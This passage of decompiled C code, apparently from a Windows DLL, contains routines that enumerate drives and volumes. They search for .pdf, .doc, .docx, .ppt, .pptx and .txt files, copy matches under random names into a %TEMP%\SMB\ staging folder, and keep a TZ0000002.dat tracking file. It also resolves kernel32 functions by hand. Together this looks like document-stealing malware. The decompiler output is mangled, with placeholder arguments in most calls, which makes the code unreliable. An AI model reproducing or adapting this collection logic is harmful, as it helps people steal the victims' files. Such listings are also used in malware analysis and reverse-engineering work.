    goto lab_0x1000991e;
  lab_0x1000992a:
    // 0x1000992a
    v30 = v14;
    *(int32_t *)(v30 - 4) = (int32_t)&lpFindFileData;
    v11 = v30 - 8;
    *(int32_t *)v11 = v3;
    if (!FindNextFileA(&g161, (struct _WIN32_FIND_DATAA *)&g161)) {
        // break -> 0x10009945
        goto lab_0x10009945;
    }
    goto lab_0x10009730;
  lab_0x1000991e:
    // 0x1000991e
    WriteFile(&g161, &g161, (int32_t)&g161, &g161, (struct _OVERLAPPED *)&g161);
    v14 = v32 - 4;
    goto lab_0x1000992a;
  lab_0x1000984e:
    // 0x1000984e
    *(int32_t *)(v12 - 8) = v8;
    lstrcpyA((char *)&g161, (char *)&g161);
    *(int32_t *)(v12 - 12) = (int32_t)&g18;
    *(int32_t *)(v12 - 16) = v8;
    lstrcatA((char *)&g161, (char *)&g161);
    *(int32_t *)(v12 - 20) = v6;
    *(int32_t *)(v12 - 24) = v8;
    lstrcatA((char *)&g161, (char *)&g161);
    *(int32_t *)(v12 - 28) = 0;
    *(int32_t *)(v12 - 32) = v10;
    *(int32_t *)(v12 - 36) = v8;
    *(int32_t *)(v12 - 40) = lstrlenA((char *)&g161) + 1;
    *(int32_t *)(v12 - 44) = v8;
    WriteFile(&g161, &g161, (int32_t)&g161, &g161, (struct _OVERLAPPED *)&g161);
    *(int32_t *)(v12 - 52) = 0;
    *(int32_t *)(v12 - 56) = v10;
    *(int32_t *)(v12 - 60) = 2;
    int32_t v33 = v12 - 64; // 0x100098b0
    *(int32_t *)v33 = (int32_t)&g19;
    v32 = v33;
    goto lab_0x1000991e;
}

// Address range: 0x10009970 - 0x10009ac3
int32_t function_10009970(int32_t lpString2, int32_t a2) {
    // 0x10009970
    int32_t lpFileName; // 0x10009970
    int32_t * fileHandle = CreateFileA((char *)lpFileName, -0x80000000, 7, NULL, 3, 128, NULL); // 0x100099ad
    int32_t lpFileSizeHigh; // bp-1016, 0x10009970
    int32_t nNumberOfBytesToRead = GetFileSize(fileHandle, &lpFileSizeHigh); // 0x100099bd
    if (fileHandle == (int32_t *)-1 || nNumberOfBytesToRead == 0) {
        // 0x10009ab0
        return _40___security_check_cookie_40_4();
    }
    char lpString1 = lpFileName; // bp-1008, 0x100099e0
    lstrcatA(&lpString1, (char *)lpString2);
    lstrcatA(&lpString1, (char *)(lpFileName + 2));
    int32_t v1 = lstrlenA(&lpString1) + 2 * nNumberOfBytesToRead; // 0x10009a2f
    lpFileSizeHigh = v1;
    int32_t hHeap; // 0x10009970
    int32_t * lpString1_ = HeapAlloc((int32_t *)hHeap, 8, v1 + 10); // 0x10009a44
    lstrcpyA((char *)lpString1_, &lpString1);
    int32_t v2 = lstrlenA(&lpString1); // 0x10009a61
    int32_t v3 = v2 + (int32_t)lpString1_;
    ReadFile(fileHandle, (int32_t *)(v3 + 1), nNumberOfBytesToRead, &lpFileSizeHigh, NULL);
    CloseHandle(fileHandle);
    *(char *)v3 = 95;
    *(int32_t *)a2 = nNumberOfBytesToRead + 1 + v2;
    return _40___security_check_cookie_40_4();
}

// Address range: 0x10009ad0 - 0x10009b17
int32_t function_10009ad0(void) {
    int32_t v1; // 0x10009ad0
    int32_t v2; // 0x10009afa
    unsigned char v3; // 0x10009b00
    for (int32_t i = 0; i < 20; i++) {
        uint32_t v4 = GetTickCount() >> i;
        v2 = 2 * v4 / 62;
        v3 = *(char *)(v4 + (int32_t)"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz" + v2);
        *(char *)(i + v1) = v3;
    }
    // 0x10009b0f
    *(char *)(v1 + 20) = 0;
    return -v2 & -256 | (int32_t)v3;
}

// Address range: 0x10009b20 - 0x10009d99
int32_t function_10009b20(int32_t lpString2, int32_t a2, int32_t a3) {
    // 0x10009b20
    int32_t lpString1; // bp-1108, 0x10009b20
    lstrcpyA((char *)&lpString1, (char *)lpString2);
    lstrcatA((char *)&lpString1, "TZ0000002.dat");
    uint32_t v1; // 0x10009b20
    if (v1 == 0) {
        // 0x10009d89
        return _40___security_check_cookie_40_4();
    }
    // 0x10009b8a
    int32_t v2; // bp-2108, 0x10009b20
    int32_t v3 = &v2;
    int32_t v4 = a3; // 0x10009b91
    int32_t v5; // bp-2172, 0x10009b20
    int32_t v6 = &v5; // 0x10009b91
    int32_t v7; // 0x10009b20
    int32_t v8; // 0x10009b20
    int32_t v9; // 0x10009b20
    int32_t v10; // 0x10009b20
    int32_t v11; // 0x10009b20
    int32_t v12; // 0x10009b20
    int32_t v13; // 0x10009b20
    int32_t v14; // 0x10009b20
    while (true) {
      lab_0x10009b97:
        // 0x10009b97
        v10 = v9;
        v12 = v6;
        v8 = v4;
        v13 = v4;
        v7 = v10 + 1;
        if (*(char *)v10 != 72) {
            goto lab_0x10009bd1;
        } else {
            // 0x10009b9c
            if (*(char *)v7 != 85) {
                goto lab_0x10009bd1;
            } else {
                // 0x10009ba2
                if (*(char *)(v10 + 2) != 71) {
                    goto lab_0x10009bd1;
                } else {
                    // 0x10009ba8
                    if (*(char *)(v10 + 3) != 69) {
                        goto lab_0x10009bd1;
                    } else {
                        // 0x10009bae
                        if (*(char *)(v10 + 4) != 58) {
                            goto lab_0x10009bd1;
                        } else {
                            // 0x10009bb4
                            *(int32_t *)(v12 - 4) = v10;
                            int32_t lpString = v13 + 1 + lstrlenA((char *)&g161); // 0x10009bbe
                            int32_t v15 = v12 - 8; // 0x10009bc0
                            *(int32_t *)v15 = v10;
                            int32_t v16 = lstrlenA((char *)lpString); // 0x10009bc7
                            v14 = lpString;
                            v6 = v15;
                            v11 = v16 + v7;
                            goto lab_0x10009d76;
                        }
                    }
                }
            }
        }
    }
  lab_0x10009d89:
    // 0x10009d89
    return _40___security_check_cookie_40_4();
  lab_0x10009bd1:;
    int32_t v17 = v12 - 4; // 0x10009bd1
    *(int32_t *)v17 = v10;
    char v18 = *(char *)(lstrlenA((char *)&g161) + v7); // 0x10009bd4
    int32_t * v19 = (int32_t *)(v12 - 8);
    int32_t v20; // 0x10009b20
    int32_t v21; // 0x10009b20
    int32_t v22; // bp-2136, 0x10009b20
    int32_t v23; // 0x10009c12
    if (v18 != 49) {
        // 0x10009bfc
        *v19 = (int32_t)&v22;
        int32_t v24 = v12 - 12; // 0x10009c09
        int32_t * v25 = (int32_t *)v24; // 0x10009c09
        *v25 = a3;
        int32_t * v26 = (int32_t *)(v12 - 16); // 0x10009c0f
        *v26 = v8;
        v23 = function_10009970((int32_t)&g161, (int32_t)&g161);
        v21 = v17;
        if (v23 == 0) {
            goto lab_0x10009cf5;
        } else {
            // 0x10009c28
            *v19 = (int32_t)".pdf";
            *v25 = v10;
            char * v27 = StrStrIA((char *)v23, (char *)&g161); // 0x10009c2e
            v20 = v24;
            if (v27 != NULL) {
                goto lab_0x10009c74;
            } else {
                // 0x10009c34
                *v26 = (int32_t)".doc";
                int32_t v28 = v12 - 20; // 0x10009c39
                *(int32_t *)v28 = v10;
                char * v29 = StrStrIA((char *)&g161, (char *)&g161); // 0x10009c3a
                v20 = v28;
                if (v29 != NULL) {
                    goto lab_0x10009c74;
                } else {
                    // 0x10009c40
                    *(int32_t *)(v12 - 24) = (int32_t)".docx";
                    int32_t v30 = v12 - 28; // 0x10009c45
                    *(int32_t *)v30 = v10;
                    char * v31 = StrStrIA((char *)&g161, (char *)&g161); // 0x10009c46
                    v20 = v30;
                    if (v31 != NULL) {
                        goto lab_0x10009c74;
                    } else {
                        // 0x10009c4c
                        *(int32_t *)(v12 - 32) = (int32_t)".ppt";
                        int32_t v32 = v12 - 36; // 0x10009c51
                        *(int32_t *)v32 = v10;
                        char * v33 = StrStrIA((char *)&g161, (char *)&g161); // 0x10009c52
                        v20 = v32;
                        if (v33 != NULL) {
                            goto lab_0x10009c74;
                        } else {
                            // 0x10009c58
                            *(int32_t *)(v12 - 40) = (int32_t)".pptx";
                            int32_t v34 = v12 - 44; // 0x10009c5d
                            *(int32_t *)v34 = v10;
                            char * v35 = StrStrIA((char *)&g161, (char *)&g161); // 0x10009c5e
                            v20 = v34;
                            if (v35 != NULL) {
                                goto lab_0x10009c74;
                            } else {
                                // 0x10009c64
                                *(int32_t *)(v12 - 48) = (int32_t)".txt";
                                int32_t v36 = v12 - 52; // 0x10009c69
                                *(int32_t *)v36 = v10;
                                char * v37 = StrStrIA((char *)&g161, (char *)&g161); // 0x10009c6a
                                v20 = v36;
                                v21 = v36;
                                if (v37 == NULL) {
                                    goto lab_0x10009cf5;
                                } else {
                                    goto lab_0x10009c74;
                                }
                            }
                        }
                    }
                }
            }
        }
    } else {
        // 0x10009bdb
        *v19 = v10;
        int32_t lpString3 = v13 + 3 + lstrlenA((char *)&g161); // 0x10009be7
        int32_t v38 = v12 - 12; // 0x10009be9
        *(int32_t *)v38 = v10;
        int32_t v39 = lstrlenA((char *)lpString3); // 0x10009bf0
        v14 = lpString3;
        v6 = v38;
        v11 = v10 + 3 + v39;
        goto lab_0x10009d76;
    }
  lab_0x10009cf5:
    // 0x10009cf5
    *(int32_t *)(v21 - 4) = v10;
    int32_t lpString4 = v13 + 3 + lstrlenA((char *)&g161); // 0x10009d03
    *(int32_t *)(v21 - 8) = v10;
    int32_t v40 = lstrlenA((char *)lpString4); // 0x10009d0c
    *(int32_t *)(v21 - 12) = 0;
    *(int32_t *)(v21 - 16) = 128;
    *(int32_t *)(v21 - 20) = 4;
    *(int32_t *)(v21 - 24) = 0;
    int32_t v41 = v10 + 3 + v40; // 0x10009d1c
    *(int32_t *)(v21 - 28) = 7;
    *(int32_t *)(v21 - 32) = 4;
    *(int32_t *)(v21 - 36) = (int32_t)&lpString1;
    *(char *)(v41 - 2) = 49;
    int32_t * fileHandle = CreateFileA((char *)&g161, (int32_t)&g161, (int32_t)&g161, (struct _SECURITY_ATTRIBUTES *)&g161, (int32_t)&g161, (int32_t)&g161, &g161); // 0x10009d2d
    int32_t v42 = (int32_t)fileHandle; // 0x10009d2d
    *(int32_t *)(v21 - 40) = 2;
    *(int32_t *)(v21 - 44) = 0;
    *(int32_t *)(v21 - 48) = 0;
    *(int32_t *)(v21 - 52) = lpString2;
    SetFilePointer(&g161, (int32_t)&g161, &g161, (int32_t)&g161);
    *(int32_t *)(v21 - 56) = 0;
    int32_t v43; // bp-2140, 0x10009b20
    *(int32_t *)(v21 - 60) = (int32_t)&v43;
    *(int32_t *)(v21 - 64) = v10;
    *(int32_t *)(v21 - 68) = lstrlenA((char *)&g161) + 3;
    *(int32_t *)(v21 - 72) = v10;
    *(int32_t *)(v21 - 76) = v42;
    WriteFile(&g161, &g161, (int32_t)&g161, &g161, (struct _OVERLAPPED *)&g161);
    int32_t v44 = v21 - 80; // 0x10009d63
    *(int32_t *)v44 = v42;
    CloseHandle(&g161);
    v14 = lpString4;
    v6 = v44;
    v11 = v41;
    goto lab_0x10009d76;
  lab_0x10009d76:
    // 0x10009d76
    v4 = v14;
    v9 = v11;
    if (v4 >= v1) {
        // break -> 0x10009d89
        goto lab_0x10009d89;
    }
    goto lab_0x10009b97;
  lab_0x10009c74:
    // 0x10009c74
    *(int32_t *)(v20 - 4) = 200;
    Sleep((int32_t)&g161);
    function_10009ad0();
    *(int32_t *)(v20 - 8) = lpString2;
    *(int32_t *)(v20 - 12) = v3;
    lstrcpyA((char *)&g161, (char *)&g161);
    int32_t v45; // bp-108, 0x10009b20
    *(int32_t *)(v20 - 16) = (int32_t)&v45;
    *(int32_t *)(v20 - 20) = v3;
    lstrcatA((char *)&g161, (char *)&g161);
    *(int32_t *)(v20 - 24) = 0;
    *(int32_t *)(v20 - 28) = 128;
    *(int32_t *)(v20 - 32) = 2;
    *(int32_t *)(v20 - 36) = 0;
    *(int32_t *)(v20 - 40) = 0;
    *(int32_t *)(v20 - 44) = 0x40000000;
    *(int32_t *)(v20 - 48) = v3;
    int32_t * fileHandle2 = CreateFileA((char *)&g161, (int32_t)&g161, (int32_t)&g161, (struct _SECURITY_ATTRIBUTES *)&g161, (int32_t)&g161, (int32_t)&g161, &g161); // 0x10009cc4
    int32_t v46 = (int32_t)fileHandle2; // 0x10009cc4
    *(int32_t *)(v20 - 52) = 0;
    int32_t v47; // bp-2144, 0x10009b20
    *(int32_t *)(v20 - 56) = (int32_t)&v47;
    *(int32_t *)(v20 - 60) = v22;
    *(int32_t *)(v20 - 64) = v23;
    *(int32_t *)(v20 - 68) = v46;
    WriteFile(&g161, &g161, (int32_t)&g161, &g161, (struct _OVERLAPPED *)&g161);
    int32_t v48 = v20 - 72; // 0x10009ce8
    *(int32_t *)v48 = v46;
    CloseHandle(&g161);
    v21 = v48;
    goto lab_0x10009cf5;
}

// Address range: 0x10009da0 - 0x10009e97
int32_t function_10009da0(int32_t a1, uint32_t a2) {
    // 0x10009da0
    int32_t result; // 0x10009da0
    if (a2 == 0) {
        // 0x10009e72
        return result;
    }
    int32_t lpString = 0; // 0x10009dc0
    int32_t v1; // bp-28, 0x10009da0
    int32_t v2 = &v1; // 0x10009dc0
    int32_t v3 = a1; // 0x10009dc0
    int32_t v4; // 0x10009da0
    int32_t v5; // 0x10009da0
    int32_t v6; // 0x10009da0
    int32_t v7; // 0x10009da0
    int32_t v8; // 0x10009da0
    int32_t v9; // 0x10009da0
    int32_t v10; // 0x10009da0
    uint32_t v11; // 0x10009da0
    while (true) {
      lab_0x10009dc6:
        // 0x10009dc6
        v5 = v3;
        v8 = v2;
        v10 = lpString;
        if (*(char *)v5 != 72) {
            goto lab_0x10009de3;
        } else {
            int32_t v12 = v5 + 1;
            if (*(char *)v12 != 85) {
                goto lab_0x10009de3;
            } else {
                // 0x10009dd1
                if (*(char *)(v5 + 2) != 71) {
                    goto lab_0x10009de3;
                } else {
                    // 0x10009dd7
                    if (*(char *)(v5 + 3) != 69) {
                        goto lab_0x10009de3;
                    } else {
                        // 0x10009ddd
                        v4 = v12;
                        v9 = v8;
                        v7 = v10;
                        v6 = v5;
                        if (v11 == 0 | *(char *)(v5 + 4) == 58) {
                            goto lab_0x10009e53;
                        } else {
                            goto lab_0x10009df1_2;
                        }
                    }
                }
            }
        }
    }
    // 0x10009e72
    return result;
  lab_0x10009e53:
    // 0x10009e53
    *(int32_t *)(v9 - 4) = v6;
    lpString = v7 + 1 + lstrlenA((char *)&g161);
    v2 = v9 - 8;
    *(int32_t *)v2 = v6;
    int32_t v13 = lstrlenA((char *)lpString); // 0x10009e5d
    v3 = v6 + 1 + v13;
    result = v13;
    if (lpString >= a2) {
        return result;
    }
    goto lab_0x10009dc6;
  lab_0x10009e2f:;
    // 0x10009e2f
    int32_t v14; // 0x10009da0
    int32_t v15; // 0x10009da0
    *(int32_t *)(v15 - 12) = v14;
    int32_t v16; // 0x10009da0
    int32_t lpString2 = v16 + 3 + lstrlenA((char *)&g161); // 0x10009e38
    int32_t v17 = v15 - 16; // 0x10009e3a
    *(int32_t *)v17 = v14;
    int32_t v18 = lstrlenA((char *)lpString2); // 0x10009e3e
    int32_t v19 = lpString2; // 0x10009e40
    int32_t v20 = v18; // 0x10009e40
    int32_t v21 = v17; // 0x10009e40
    int32_t v22 = v14 + 3; // 0x10009e40
    goto lab_0x10009e43;
  lab_0x10009e43:;
    int32_t v23 = v19; // 0x10009e4e
    int32_t v24 = v21; // 0x10009e4e
    int32_t v25 = v22 + v20; // 0x10009e4e
    v9 = v21;
    v7 = v10;
    v6 = v5;
    if (v19 >= v11) {
        goto lab_0x10009e53;
    }
    goto lab_0x10009df1;
  lab_0x10009de3:
    // 0x10009de3
    v9 = v8;
    v7 = v10;
    v6 = v5;
    if (v11 == 0) {
        goto lab_0x10009e53;
    } else {
        // 0x10009de3
        v4 = v5 + 1;
        goto lab_0x10009df1_2;
    }
  lab_0x10009df1_2:;
    int32_t v27 = v4;
    v23 = 0;
    v24 = v8;
    int32_t v26; // 0x10009da0
    while (true) {
      lab_0x10009df1:
        // 0x10009df1
        v14 = v25;
        v15 = v24;
        v16 = v23;
        v26 = v14 + 1;
        *(int32_t *)(v15 - 4) = v27;
        *(int32_t *)(v15 - 8) = v26;
        if (lstrcmpA((char *)&g161, (char *)&g161) == 0) {
            // break -> 0x10009e78
            break;
        }
        // 0x10009e00
        if (*(char *)v14 != 72) {
            goto lab_0x10009e2f;
        } else {
            // 0x10009e05
            if (*(char *)v26 != 85) {
                goto lab_0x10009e2f;
            } else {
                // 0x10009e0b
                if (*(char *)(v14 + 2) != 71) {
                    goto lab_0x10009e2f;
                } else {
                    // 0x10009e11
                    if (*(char *)(v14 + 3) != 69) {
                        goto lab_0x10009e2f;
                    } else {
                        // 0x10009e17
                        if (*(char *)(v14 + 4) != 58) {
                            goto lab_0x10009e2f;
                        } else {
                            // 0x10009e1d
                            *(int32_t *)(v15 - 12) = v14;
                            int32_t lpString3 = v16 + 1 + lstrlenA((char *)&g161); // 0x10009e24
                            int32_t v28 = v15 - 16; // 0x10009e26
                            *(int32_t *)v28 = v14;
                            int32_t v29 = lstrlenA((char *)lpString3); // 0x10009e2a
                            v19 = lpString3;
                            v20 = v29;
                            v21 = v28;
                            v22 = v26;
                            goto lab_0x10009e43;
                        }
                    }
                }
            }
        }
    }
    // 0x10009e78
    *(int32_t *)(v15 - 12) = v14;
    int32_t v30 = lstrlenA((char *)&g161); // 0x10009e79
    *(int32_t *)(v15 - 16) = v14;
    *(char *)(v30 + v26) = 49;
    lstrlenA((char *)&g161);
    *(int32_t *)(v15 - 20) = v14;
    lstrlenA((char *)&g161);
    *(int32_t *)(v15 - 24) = v5;
    int32_t v31 = lstrlenA((char *)&g161); // 0x10009e87
    int32_t v32 = v15 - 28; // 0x10009e8d
    *(int32_t *)v32 = v5;
    int32_t v33 = lstrlenA((char *)&g161); // 0x10009e90
    v9 = v32;
    v7 = v10 + 1 + v31;
    v6 = v33 + v27;
    goto lab_0x10009e53;
}

// Address range: 0x10009ea0 - 0x1000a2b0
int32_t function_10009ea0(int32_t a1) {
    int32_t lpSectorsPerCluster = 64; // bp-3088, 0x10009ec2
    __asm_rep_movsd_memcpy((char *)LocalAlloc(64, 1024), (char *)a1, 250);
    GetTempPathA(1000, (char *)&g161);
    int32_t lpString1; // bp-3032, 0x10009ea0
    lstrcatA((char *)&lpString1, "SMB\\");
    int32_t lpPathName; // bp-3040, 0x10009ea0
    CreateDirectoryA((char *)&lpPathName, NULL);
    HeapCreate(0, 0, 0);
    int32_t lpTotalNumberOfClusters; // bp-3072, 0x10009ea0
    int32_t lpBytesPerSector; // bp-3076, 0x10009ea0
    int32_t lpNumberOfFreeClusters; // bp-3080, 0x10009ea0
    GetDiskFreeSpaceA("C:\\", &lpSectorsPerCluster, &lpBytesPerSector, &lpNumberOfFreeClusters, &lpTotalNumberOfClusters);
    return _40___security_check_cookie_40_4();
}

// Address range: 0x1000a2b0 - 0x1000a688
int32_t function_1000a2b0(void) {
    // 0x1000a2b0
    int32_t v1; // bp-115, 0x1000a2b0
    _memset(&v1, 0, 99);
    int32_t lpModuleName = 0x6e72656b; // bp-116, 0x1000a2d6
    int32_t moduleHandle = (int32_t)GetModuleHandleA((char *)&lpModuleName); // 0x1000a2f3
    int32_t v2 = 0x64616f4c; // bp-216, 0x1000a2fb
    int32_t v3 = *(int32_t *)(moduleHandle + 120 + *(int32_t *)(moduleHandle + 60)) + moduleHandle; // 0x1000a32d
    int32_t v4 = function_10007210(moduleHandle, (char *)&v2); // 0x1000a339
    uint16_t v5 = *(int16_t *)(2 * v4 + moduleHandle + *(int32_t *)(v3 + 36)); // 0x1000a347
    int32_t v6 = *(int32_t *)(v3 + 28); // 0x1000a34b
    int32_t v7 = *(int32_t *)(v6 + moduleHandle + 4 * (int32_t)v5) + moduleHandle; // 0x1000a357
    g150 = v7;
    int32_t v8 = v7; // bp-1776, 0x1000a368
    function_10007210(v7, "CreateThread");
    v8 = 500;
    int32_t lpBuffer; // bp-716, 0x1000a2b0
    uint32_t v9 = GetLogicalDriveStringsA(500, (char *)&lpBuffer); // 0x1000a3aa
    if (v9 == 0) {
        // 0x1000a50e
        return _40___security_check_cookie_40_4();
    }
    // 0x1000a3c0
    int32_t v10; // bp-4, 0x1000a2b0
    int32_t v11 = &v10; // 0x1000a2b1
    int32_t v12 = &lpBuffer; // 0x1000a3c0
    int32_t v13; // bp-16, 0x1000a2b0
    int32_t v14 = &v13; // 0x1000a3cc
    int32_t v15; // bp-1716, 0x1000a2b0
    int32_t v16 = &v15;
    int32_t v17; // bp-1732, 0x1000a2b0
    int32_t v18 = &v17;
    int32_t v19; // bp-1728, 0x1000a2b0
    int32_t v20 = &v19;
    int32_t lpModuleName2 = 0; // 0x1000a3ef
    int32_t v21 = v7;
    int32_t v22 = *(int32_t *)(v7 + 120 + *(int32_t *)(v7 + 60)) + v7;
    int32_t v23 = &v8;
    *(int32_t *)(v23 - 4) = lpModuleName2 + v12;
    *(int32_t *)(v23 - 8) = v14;
    lstrcpyA((char *)&g161, (char *)&g161);
    int32_t v24 = v12;
    int32_t v25 = v24 + 1; // 0x1000a3e2
    while (*(char *)v24 != 0) {
        // 0x1000a3e0
        v24 = v25;
        v25 = v24 + 1;
    }
    // 0x1000a3e7
    *(int32_t *)(v23 - 12) = (int32_t)"GetVolumeNameForVolumeMountPointA";
    int32_t v26; // bp-715, 0x1000a2b0
    lpModuleName2 = lpModuleName2 + 1 + v25 - (int32_t)&v26;
    *(int32_t *)(v23 - 16) = (int32_t)"kernel32.dll";
    *(int32_t *)(v23 - 20) = (int32_t)GetModuleHandleA((char *)lpModuleName2);
    GetProcAddress(&g161, (char *)&g161);
    *(int32_t *)(v23 - 24) = 1000;
    *(int32_t *)(v23 - 28) = v16;
    *(int32_t *)(v23 - 32) = v14;
    GetVolumeNameForVolumeMountPointA((char *)&g161, (char *)&g161, (int32_t)&g161);
    int32_t v27 = v16;
    char v28 = *(char *)v27; // 0x1000a428
    int32_t v29 = v27 + 1; // 0x1000a42d
    while (v28 != 0) {
        // 0x1000a428
        v27 = v29;
        v28 = *(char *)v27;
        v29 = v27 + 1;
    }
    // 0x1000a42f
    int32_t v30; // bp-1715, 0x1000a2b0
    uint32_t v31 = v27 - (int32_t)&v30; // 0x1000a431
    while (v31 < 1000) {
        // 0x1000a43d
        *(int32_t *)(v23 - 36) = 0;
        *(int32_t *)(v23 - 40) = 0;
        *(int32_t *)(v23 - 44) = 3;
        *(int32_t *)(v23 - 48) = 0;
        *(int32_t *)(v23 - 52) = 3;
        *(char *)(v11 - 1712 + v31) = v28;
        *(int32_t *)(v23 - 56) = 0;
        int32_t v32 = v23 - 60; // 0x1000a456
        *(int32_t *)v32 = v16;
        int32_t * fileHandle = CreateFileA((char *)&g161, (int32_t)&g161, (int32_t)&g161, (struct _SECURITY_ATTRIBUTES *)&g161, (int32_t)&g161, (int32_t)&g161, &g161); // 0x1000a457
        int32_t v33 = v32; // 0x1000a462
        int32_t v34 = v22; // 0x1000a462
        int32_t v35 = v21; // 0x1000a462
        if (fileHandle != (int32_t *)-1) {
            int32_t v36 = (int32_t)fileHandle; // 0x1000a457
            *(int32_t *)(v23 - 64) = 1024;
            *(int32_t *)(v23 - 68) = 64;
            v17 = 0;
            v19 = 0;
            int32_t memoryHandle = (int32_t)LocalAlloc(0, 0); // 0x1000a48d
            *(int32_t *)(v23 - 72) = 0;
            *(int32_t *)(v23 - 76) = v18;
            *(int32_t *)(v23 - 80) = 1024;
            *(int32_t *)(v23 - 84) = memoryHandle;
            *(int32_t *)(v23 - 88) = 12;
            int32_t * v37 = (int32_t *)(memoryHandle + 4); // 0x1000a4ac
            *v37 = 1024;
            *(int32_t *)(v23 - 92) = v20;
            *(int32_t *)(v23 - 96) = 0x2d1400;
            *(int32_t *)(v23 - 100) = v36;
            bool v38 = DeviceIoControl(&g161, (int32_t)&g161, &g161, (int32_t)&g161, &g161, (int32_t)&g161, &g161, (struct _OVERLAPPED *)&g161); // 0x1000a4ba
            int32_t v39 = v23 - 104; // 0x1000a4c0
            *(int32_t *)v39 = v36;
            CloseHandle(&g161);
            v33 = v39;
            v34 = 0;
            v35 = memoryHandle;
            if (v38) {
                // 0x1000a4cd
                v33 = v39;
                v34 = -1;
                v35 = memoryHandle;
                if (*(int32_t *)(memoryHandle + 28) == 7) {
                    // 0x1000a4d3
                    v33 = v39;
                    v34 = -1;
                    v35 = memoryHandle;
                    if (*(char *)(memoryHandle + 8) == 0) {
                        // 0x1000a4d9
                        *(int32_t *)(memoryHandle + 1 + *v37) = v13;
                        int32_t v40; // bp-1748, 0x1000a2b0
                        *(int32_t *)(v23 - 108) = (int32_t)&v40;
                        *(int32_t *)(v23 - 112) = 0;
                        *(int32_t *)(v23 - 116) = memoryHandle;
                        *(int32_t *)(v23 - 120) = 0x10009ea0;
                        *(int32_t *)(v23 - 124) = 0;
                        int32_t v41 = v23 - 128; // 0x1000a4f4
                        *(int32_t *)v41 = 0;
                        v33 = v41;
                        v34 = -1;
                        v35 = memoryHandle;
                    }
                }
            }
        }
        // 0x1000a4fc
        if (lpModuleName2 >= v9) {
            // 0x1000a50e
            return _40___security_check_cookie_40_4();
        }
        v21 = v35;
        v22 = v34;
        v23 = v33;
        *(int32_t *)(v23 - 4) = lpModuleName2 + v12;
        *(int32_t *)(v23 - 8) = v14;
        lstrcpyA((char *)&g161, (char *)&g161);
        v24 = v12;
        v25 = v24 + 1;
        while (*(char *)v24 != 0) {
            // 0x1000a3e0
            v24 = v25;
            v25 = v24 + 1;
        }
        // 0x1000a3e7
        *(int32_t *)(v23 - 12) = (int32_t)"GetVolumeNameForVolumeMountPointA";
        lpModuleName2 = lpModuleName2 + 1 + v25 - (int32_t)&v26;
        *(int32_t *)(v23 - 16) = (int32_t)"kernel32.dll";
        *(int32_t *)(v23 - 20) = (int32_t)GetModuleHandleA((char *)lpModuleName2);
        GetProcAddress(&g161, (char *)&g161);
        *(int32_t *)(v23 - 24) = 1000;
        *(int32_t *)(v23 - 28) = v16;
        *(int32_t *)(v23 - 32) = v14;
        GetVolumeNameForVolumeMountPointA((char *)&g161, (char *)&g161, (int32_t)&g161);
        v27 = v16;
        v28 = *(char *)v27;
        v29 = v27 + 1;
        while (v28 != 0) {
            // 0x1000a428
            v27 = v29;
            v28 = *(char *)v27;
            v29 = v27 + 1;
        }
        // 0x1000a42f
        v31 = v27 - (int32_t)&v30;
    }
    // 0x1000a51f
    function_1000b43d();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    int32_t v42 = v23 - 36; // 0x1000a530
    *(int32_t *)v42 = v11;
    *(int32_t *)(v23 - 40) = g66 ^ v42;
    *(int32_t *)(v23 - 1700) = lpModuleName2;
    *(int32_t *)(v23 - 1704) = v22;
    *(int32_t *)(v23 - 1708) = v21;
    *(int32_t *)(v23 - 1712) = 1000;
    *(int32_t *)(v23 - 1716) = 64;
    int32_t memoryHandle2 = (int32_t)LocalAlloc((int32_t)&g161, (int32_t)&g161); // 0x1000a54d
    int32_t v43 = v23 - 1044; // 0x1000a555
    *(int32_t *)(v23 - 1720) = v43;
    *(int32_t *)(v23 - 1724) = 1000;
    int32_t * v44 = (int32_t *)(v23 - 1692); // 0x1000a561
    *v44 = memoryHandle2;
    GetTempPathA((int32_t)&g161, (char *)&g161);
    *(int32_t *)(v23 - 1728) = (int32_t)"SMB\\*";
    *(int32_t *)(v23 - 1732) = v43;
    lstrcatA((char *)&g161, (char *)&g161);
    int32_t v45 = v23 - 1364; // 0x1000a57f
    *(int32_t *)(v23 - 1736) = v45;
    int32_t v46 = v23 - 1740; // 0x1000a58c
    *(int32_t *)v46 = v43;
    int32_t * v47 = FindFirstFileA((char *)&g161, (struct _WIN32_FIND_DATAA *)&g161); // 0x1000a58d
    int32_t v48 = (int32_t)v47; // 0x1000a58d
    int32_t * v49 = (int32_t *)(v23 - 1688); // 0x1000a595
    *v49 = v48;
    if (v47 == (int32_t *)-1) {
        // 0x1000a65e
        return _40___security_check_cookie_40_4();
    }
    int32_t v50 = v23 - 1320;
    int32_t v51 = v23 - 1684;
    int32_t v52 = v46; // 0x1000a5b7
    int32_t v53 = v48; // 0x1000a5b7
    int32_t v54 = memoryHandle2; // 0x1000a5b7
    int32_t v55; // 0x1000a2b0
    int32_t v56; // 0x1000a2b0
    int32_t v57; // 0x1000a2b0
    int32_t v58; // 0x1000a2b0
    int32_t v59; // 0x1000a607
    int32_t * v60; // 0x1000a608
    int32_t v61; // 0x1000a608
    int32_t v62; // 0x1000a626
    bool v63; // 0x1000a627
    int32_t v64; // 0x1000a62d
    if ((*(char *)v45 & 16) != 0) {
        // 0x1000a5bd
        v52 = v46;
        v53 = v48;
        v54 = memoryHandle2;
        if (*(char *)v50 != 46) {
            // 0x1000a5ca
            *(int32_t *)(v46 - 4) = v43;
            *(int32_t *)(v46 - 8) = memoryHandle2;
            lstrcpyA((char *)&g161, (char *)&g161);
            *(int32_t *)(v46 - 12) = memoryHandle2;
            *(char *)(memoryHandle2 - 1 + lstrlenA((char *)&g161)) = 0;
            *(int32_t *)(v46 - 16) = v50;
            *(int32_t *)(v46 - 20) = memoryHandle2;
            lstrcatA((char *)&g161, (char *)&g161);
            *(int32_t *)(v46 - 24) = (int32_t)"\\*";
            *(int32_t *)(v46 - 28) = memoryHandle2;
            lstrcatA((char *)&g161, (char *)&g161);
            *(int32_t *)(v46 - 32) = v51;
            v59 = v46 - 36;
            *(int32_t *)v59 = memoryHandle2;
            v60 = FindFirstFileA((char *)&g161, (struct _WIN32_FIND_DATAA *)&g161);
            v61 = (int32_t)v60;
            v56 = v59;
            v64 = v59;
            if (v60 != (int32_t *)-1) {
                v57 = v56;
                v58 = (*(char *)v51 & 16) == 0;
